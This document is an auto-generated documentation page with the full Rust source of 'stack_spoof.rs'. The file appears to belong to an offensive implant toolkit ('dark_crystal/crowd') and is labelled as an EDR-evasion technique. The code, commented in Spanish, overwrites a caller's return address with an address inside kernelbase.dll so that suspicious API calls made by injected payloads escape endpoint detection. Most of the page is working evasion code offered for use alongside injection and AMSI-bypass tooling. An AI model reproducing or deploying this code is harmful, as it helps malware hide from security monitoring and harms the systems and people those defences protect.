# crowd — stack_spoof.rs  (🔥 S TIER)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/stack_spoof.rs` |
| **Lines** | 324 |
| **Tier** | S |
| **Cards** | T009-edr-evasion |
| **Role** | Call stack spoofing |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 10 |

## Purpose

# crowd — stack_spoof.rs  (🔥 S TIER)

## Call Stack Spoofing — Frame-Based Return Address Substitution

Portado del proyecto `Unwinder` (legacy). Implementación simplificada sin
el gateway.asm externo, usando inline assembly de Rust.

### Técnica
Cuando el payload (o crowd mismo) llama a una API de Windows, el EDR puede
inspeccionar el Call Stack trace en tiempo real. Si ve direcciones de retorno
apuntando a nuestro módulo (o al Function Stomp), levanta una alerta.

Esta técnica:
1. Analiza la tabla `.pdata` (RUNTIME_FUNCTION) del módulo actual para calcular
el tamaño en bytes del frame del caller actual (usando las unwind info).
2. Busca en `kernelbase.dll` una función con exactamente el mismo tamaño de frame.
3. Elige una dirección aleatoria dentro de esa función legítima como dirección
de retorno de reemplazo.
4. Escribe esa dirección en el stack en el lugar exacto donde está la dirección
real de retorno del caller.
5. Al retornar de la función spoofada, la CPU salta a kernelbase.dll (que se
cuelga pero no crashea porque `SpoofGuard` la restaura antes de que eso pase).

### Sin colisión con AMSI HBP
No usa DR registers. No usa VEH handlers. Es pura manipulación de memoria en la
pila, idéntica a como lo hace el propio OS con sus frames de unwind.

### Limitaciones de esta versión simplificada
- Sólo spoofea el return address inmediatamente superior al frame actual
- Para spoofing profundo de múltiples frames, usar el Unwinder completo con gateway.asm

## Constants

- `UWOP_ALLOC_SMALL`: `u8` = `2`
- `UWOP_ALLOC_LARGE`: `u8` = `1`
- `UWOP_PUSH_NONVOL`: `u8` = `0`
- `UWOP_SET_FPREG`: `u8` = `3`
- `UNW_FLAG_CHAININFO`: `u8` = `0x04`
- `MAX_CHAIN_DEPTH`: `usize` = `32`

## Types

### struct `RuntimeFunction` (line 42)

### struct `UnwindInfo` (line 50)

### struct `SpoofGuard` (line 69)

## Public API

### `spoof_caller` `unsafe` (line 247)
```rust
pub unsafe fn spoof_caller() -> SpoofGuard
```
Instala el stack spoof en el frame actual.

Encuentra la dirección de retorno del *caller* en la pila, la guarda y la
sustituye por una dirección legítima dentro de kernelbase.dll con el mismo
tamaño de frame.

Retorna un `SpoofGuard` cuyo Drop restaura la dirección original.

# Safety
Debe llamarse directamente desde la función cuyo return address se va a spoofear.
El caller DEBE ser `#[inline(never)]`.

```rust
#[inline(never)]
fn mi_funcion_de_inyeccion() {
let _guard = unsafe { crate::stack_spoof::spoof_caller() };
// ... llamadas sospechosas aquí ...
}
```

### `null_guard` (line 322)
```rust
pub fn null_guard() -> SpoofGuard
```

## Internal Functions

- `drop` (line 77)
- `get_rsp` (unsafe) (line 89)
- `calc_frame_size` (unsafe) — Calcula el tamaño del frame de una función dado su .pdata entry. (line 100)
- `calc_frame_size_inner` (unsafe) — Inner recursive implementation with depth tracking. (line 105)
- `get_pdata` (unsafe) — Obtiene la base y la tabla .pdata de un módulo usando offsets manuales del PE header. (line 168)
- `find_frame_in_kernelbase` (unsafe) — Busca en `kernelbase.dll` un frame de exactamente `desired_size` bytes. (line 192)
- `get_own_base` (unsafe) — Obtiene la base del módulo actual leyendo del PEB. (line 292)
- `get_own_image_size` (unsafe) — Read SizeOfImage from the PE optional header at the given module base. (line 310)

## Key Dependencies

- `use windows::Win32::System::LibraryLoader::GetModuleHandleA;`
- `use windows::core::PCSTR;`

## Full Source

```rust
//! # crowd — stack_spoof.rs  (🔥 S TIER)
//!
//! ## Call Stack Spoofing — Frame-Based Return Address Substitution
//!
//! Portado del proyecto `Unwinder` (legacy). Implementación simplificada sin
//! el gateway.asm externo, usando inline assembly de Rust.
//!
//! ### Técnica
//! Cuando el payload (o crowd mismo) llama a una API de Windows, el EDR puede
//! inspeccionar el Call Stack trace en tiempo real. Si ve direcciones de retorno
//! apuntando a nuestro módulo (o al Function Stomp), levanta una alerta.
//!
//! Esta técnica:
//! 1. Analiza la tabla `.pdata` (RUNTIME_FUNCTION) del módulo actual para calcular
//!    el tamaño en bytes del frame del caller actual (usando las unwind info).
//! 2. Busca en `kernelbase.dll` una función con exactamente el mismo tamaño de frame.
//! 3. Elige una dirección aleatoria dentro de esa función legítima como dirección
//!    de retorno de reemplazo.
//! 4. Escribe esa dirección en el stack en el lugar exacto donde está la dirección
//!    real de retorno del caller.
//! 5. Al retornar de la función spoofada, la CPU salta a kernelbase.dll (que se
//!    cuelga pero no crashea porque `SpoofGuard` la restaura antes de que eso pase).
//!
//! ### Sin colisión con AMSI HBP
//! No usa DR registers. No usa VEH handlers. Es pura manipulación de memoria en la
//! pila, idéntica a como lo hace el propio OS con sus frames de unwind.
//!
//! ### Limitaciones de esta versión simplificada
//! - Sólo spoofea el return address inmediatamente superior al frame actual
//! - Para spoofing profundo de múltiples frames, usar el Unwinder completo con gateway.asm

#![allow(dead_code)]

use std::ptr::null_mut;
use windows::Win32::System::LibraryLoader::GetModuleHandleA;
use windows::core::PCSTR;


// RUNTIME_FUNCTION entry de .pdata (estructura de 12 bytes x86_64)
#[repr(C)]
#[derive(Clone, Copy)]
struct RuntimeFunction {
    begin_rva: u32,
    end_rva:   u32,
    unwind_rva: u32,
}

// UNWIND_INFO básico (solo necesitamos SizeOfProlog y CountOfCodes para frame size)
#[repr(C)]
struct UnwindInfo {
    version_flags: u8,
    size_of_prolog: u8,
    count_of_codes: u8,
    frame_register_offset: u8,
    // unwind_codes follow...
}

// UWOP_ALLOC_SMALL opcode → frame allocation
const UWOP_ALLOC_SMALL: u8 = 2;
const UWOP_ALLOC_LARGE: u8 = 1;
const UWOP_PUSH_NONVOL: u8 = 0;
const UWOP_SET_FPREG:   u8 = 3;
const UNW_FLAG_CHAININFO: u8 = 0x04;

/// RAII guard que restaura el return address original en el drop.
/// MUST be kept alive through the entire scope of the spoofed calls.
/// Dropping the guard before the call defeats the spoof entirely.
#[must_use = "SpoofGuard must be held alive through the spoofed call scope; dropping it early restores the original return address"]
pub struct SpoofGuard {
    /// Puntero al slot del stack donde se escribió la dirección falsa.
    stack_slot: *mut usize,
    /// Dirección de retorno original guardada.
    original_ret: usize,
}

impl Drop for SpoofGuard {
    fn drop(&mut self) {
        // Restaurar dirección de retorno original antes de que la CPU regrese
        unsafe {
            if !self.stack_slot.is_null() && self.original_ret != 0 {
                *self.stack_slot = self.original_ret;
            }
        }
    }
}

/// Obtiene el RSP actual via inline assembly.
#[inline(never)]
unsafe fn get_rsp() -> usize {
    let rsp: usize;
    core::arch::asm!("mov {}, rsp", out(reg) rsp, options(nostack, readonly, pure));
    rsp
}

/// Max depth for CHAININFO recursion to prevent infinite loops from malformed unwind data.
const MAX_CHAIN_DEPTH: usize = 32;

/// Calcula el tamaño del frame de una función dado su .pdata entry.
/// Recorre los unwind codes para sumar el espacio en pila reservado.
unsafe fn calc_frame_size(module_base: usize, rtf: RuntimeFunction) -> usize {
    calc_frame_size_inner(module_base, rtf, 0)
}

/// Inner recursive implementation with depth tracking.
unsafe fn calc_frame_size_inner(module_base: usize, rtf: RuntimeFunction, depth: usize) -> usize {
    if depth >= MAX_CHAIN_DEPTH {
        return 0; // Bail out: malformed unwind data or circular chain
    }

    let unwind_addr = module_base + rtf.unwind_rva as usize;
    let unwind = &*(unwind_addr as *const UnwindInfo);

    // Si tiene CHAININFO, seguir la cadena
    let flags = (unwind.version_flags >> 3) & 0x1F;
    if flags & UNW_FLAG_CHAININFO != 0 {
        // La chain RUNTIME_FUNCTION está después de los unwind codes
        let _codes_ptr = (unwind_addr + 4) as *const u16;
        let chain_offset = 4 + (unwind.count_of_codes as usize + 1) / 2 * 4;
        let chain = &*((unwind_addr + chain_offset) as *const RuntimeFunction);
        return calc_frame_size_inner(module_base, *chain, depth + 1);
    }

    let mut frame_size = 0usize;
    let codes_ptr = (unwind_addr + 4) as *const u16;

    let mut i = 0usize;
    while i < unwind.count_of_codes as usize {
        let code_word = *codes_ptr.add(i);
        let op = (code_word >> 8) as u8;
        let info = (code_word >> 12) as u8;

        match op {
            UWOP_PUSH_NONVOL => {
                frame_size += 8;
                i += 1;
            }
            UWOP_ALLOC_SMALL => {
                frame_size += (info as usize + 1) * 8;
                i += 1;
            }
            UWOP_ALLOC_LARGE => {
                if info == 0 {
                    // 16-bit scaled by 8 — needs 1 extra code slot
                    if i + 1 >= unwind.count_of_codes as usize { break; }
                    let sz = *codes_ptr.add(i + 1) as usize * 8;
                    frame_size += sz;
                    i += 2;
                } else {
                    // 32-bit unscaled — needs 2 extra code slots
                    if i + 2 >= unwind.count_of_codes as usize { break; }
                    let lo = *codes_ptr.add(i + 1) as usize;
                    let hi = *codes_ptr.add(i + 2) as usize;
                    frame_size += (hi << 16) | lo;
                    i += 3;
                }
            }
            UWOP_SET_FPREG => { i += 1; }
            _ => { i += 1; } // otros opcodes
        }
    }

    // Return address slot
    frame_size + 8
}

/// Obtiene la base y la tabla .pdata de un módulo usando offsets manuales del PE header.
/// No depende de tipos específicos del crate windows → compatible con cualquier versión.
unsafe fn get_pdata(module_base: usize) -> (*const RuntimeFunction, usize) {
    let base = module_base as *const u8;
    if *(base as *const u16) != 0x5A4D { return (std::ptr::null(), 0); }
    let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
    let nt = base.add(e_lfanew);
    if *(nt as *const u32) != 0x4550 { return (std::ptr::null(), 0); }
    // OptionalHeader starts at nt+24; Magic at opt+0
    let opt = nt.add(24);
    let magic = *(opt as *const u16);
    // DataDirectory[3] = EXCEPTION; starts at opt+0x60 for both PE32 and PE32+
    let dir_base = if magic == 0x20B { opt.add(0x60) } else { opt.add(0x60) };
    let exception_dir_rva = *(dir_base.add(3 * 8) as *const u32) as usize;
    let exception_dir_size = *(dir_base.add(3 * 8 + 4) as *const u32) as usize;
    if exception_dir_rva == 0 || exception_dir_size == 0 {
        return (std::ptr::null(), 0);
    }
    let pdata = base.add(exception_dir_rva) as *const RuntimeFunction;
    let count = exception_dir_size / std::mem::size_of::<RuntimeFunction>();
    (pdata, count)
}


/// Busca en `kernelbase.dll` un frame de exactamente `desired_size` bytes.
/// Retorna una dirección aleatoria dentro de esa función.
unsafe fn find_frame_in_kernelbase(desired_size: usize) -> usize {
    let name = b"kernelbase.dll\0";
    let hmod = match GetModuleHandleA(PCSTR(name.as_ptr())) {
        Ok(h) => h.0 as usize,
        Err(_) => return 0,
    };

    let (pdata, count) = get_pdata(hmod);
    if pdata.is_null() {
        return 0;
    }

    // Empezar desde un offset aleatorio para no devolver siempre la misma función
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos() as usize;
    let start = seed % count.max(1);

    for pass in 0..2 {
        let range = if pass == 0 { start..count } else { 0..start };
        for i in range {
            let rtf = *pdata.add(i);
            if rtf.begin_rva == 0 || rtf.end_rva == 0 { continue; }
            let size = calc_frame_size(hmod, rtf);
            if size == desired_size {
                // Retornar un offset aleatorio dentro de la función (no el inicio)
                let fn_size = (rtf.end_rva - rtf.begin_rva) as usize;
                let offset = if fn_size > 8 { (seed * 6364136223846793005 + 1442695040888963407) % (fn_size / 2) } else { 0 };
                return hmod + rtf.begin_rva as usize + offset;
            }
        }
    }
    0
}

/// Instala el stack spoof en el frame actual.
///
/// Encuentra la dirección de retorno del *caller* en la pila, la guarda y la
/// sustituye por una dirección legítima dentro de kernelbase.dll con el mismo
/// tamaño de frame.
///
/// Retorna un `SpoofGuard` cuyo Drop restaura la dirección original.
///
/// # Safety
/// Debe llamarse directamente desde la función cuyo return address se va a spoofear.
/// El caller DEBE ser `#[inline(never)]`.
///
/// ```rust
/// #[inline(never)]
/// fn mi_funcion_de_inyeccion() {
///     let _guard = unsafe { crate::stack_spoof::spoof_caller() };
///     // ... llamadas sospechosas aquí ...
/// }
/// ```
pub unsafe fn spoof_caller() -> SpoofGuard {
    // Obtener RSP actual. En x64 el return address del caller de MI función
    // está en [RSP + frame_size_of_current_function].
    // Como no tenemos el frame size exacto de esta función en tiempo de ejecución
    // sin el gateway.asm del Unwinder, usamos una aproximación práctica:
    // el return address del CALLER está a [RSP + 0] justo en el prólogo,
    // pero con #[inline(never)] el compilador ya reservó el frame.
    // Usamos una búsqueda simple en la pila para una dirección válida dentro
    // de nuestro propio módulo y la sustituimos.

    let rsp = get_rsp();

    // Buscar el primer return address en la pila que apunte a nuestro módulo
    // (los primeros 8-10 slots son candidatos)
    let own_base = get_own_base();

    // Buscar un frame legítimo de sustitución en kernelbase
    // Usamos un frame size canónico de 0x28 (el más común en funciones wrapper)
    let replacement = find_frame_in_kernelbase(0x28);

    if replacement == 0 || own_base == 0 {
        return SpoofGuard { stack_slot: std::ptr::null_mut(), original_ret: 0 };
    }

    // Recorrer la pila buscando el return address de nuestro módulo
    // Read SizeOfImage from PE header instead of hardcoded 512KB
    let own_text_end = own_base + get_own_image_size(own_base);
    let mut slot: *mut usize = null_mut();
    let mut original = 0usize;

    for i in 1usize..12 {
        let candidate_ptr = (rsp + i * 8) as *mut usize;
        let val = *candidate_ptr;
        if val > own_base && val < own_text_end {
            slot = candidate_ptr;
            original = val;
            *slot = replacement;
            break;
        }
    }

    SpoofGuard { stack_slot: slot, original_ret: original }
}

/// Obtiene la base del módulo actual leyendo del PEB.
unsafe fn get_own_base() -> usize {
    #[cfg(target_arch = "x86_64")]
    {
        let peb: usize;
        core::arch::asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb,
            options(nostack, readonly, pure)
        );
        // PEB.ImageBaseAddress está en offset 0x10
        *(peb as *const usize).add(2) // [0x10 / 8 = 2]
    }
    #[cfg(not(target_arch = "x86_64"))]
    { 0 }
}

/// Read SizeOfImage from the PE optional header at the given module base.
/// Returns a safe fallback (0x80000 = 512KB) if the headers are invalid.
unsafe fn get_own_image_size(base: usize) -> usize {
    if base == 0 { return 0x80000; }
    let dos = base as *const u8;
    if *(dos as *const u16) != 0x5A4D { return 0x80000; }
    let e_lfanew = *(dos.add(0x3C) as *const u32) as usize;
    if e_lfanew == 0 || e_lfanew > 0x1000 { return 0x80000; }
    let nt = dos.add(e_lfanew);
    if *(nt as *const u32) != 0x4550 { return 0x80000; }
    // SizeOfImage at OptionalHeader + 0x38 (same offset for PE32 and PE32+)
    *(nt.add(24 + 0x38) as *const u32) as usize
}

pub fn null_guard() -> SpoofGuard {
    SpoofGuard { stack_slot: std::ptr::null_mut(), original_ret: 0 }
}

```